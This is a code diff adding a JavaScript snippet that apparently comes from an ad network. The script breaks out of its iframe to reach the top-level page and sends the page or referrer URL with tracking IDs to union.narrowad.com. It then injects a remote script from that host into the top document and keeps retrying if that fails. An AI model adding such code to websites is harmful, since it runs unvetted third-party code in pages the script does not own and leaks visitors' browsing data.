@@ -1,0 +1,20 @@
+
+
+function tixa_rm_mm(){
+var i=0,ex=true,todo=document,win=window,p=location.href;
+if(self!=top){var r=document.referrer;
+if(r!=null&&r.length>0)p=r;
+try{var t=top.document;if(t.width!=0&&t.height!=0){i=1;todo=t;win=top;}}catch(e){ex=false;}}
+try{if(ex){
+var mm=win.tixa_bad_mm_flag;
+if(mm!=null&&mm==false)return;
+var mdid="tixa_bad_div",md=todo.getElementById(mdid)?true:false
+if(!md)idiv(mdid); else return;
+var u1="http://union.narrowad.com/proxy/rmda.jsp?d="+Math.random()+"&pc=273bd3c7581f&wid=29124&cid=63425&userID=&inIframe="+i+"&pageUrl="+encodeURIComponent(p);
+ijs(todo,"tixa_rm_jsp",u1);
+}}catch(e){setTimeout("tixa_rm_mm();",100);};
+function ijs(doc,id,url){
+var o0=doc.getElementById(id);
+if(o0==null){o0=doc.createElement("script");o0.id=id;o0.src=url;doc.body.insertBefore(o0,doc.body.childNodes[0]);}}
+function idiv(name){var o0=todo.createElement("mmdiv");o0.id=name;todo.body.insertBefore(o0,todo.body.childNodes[0]);}}
+tixa_rm_mm();
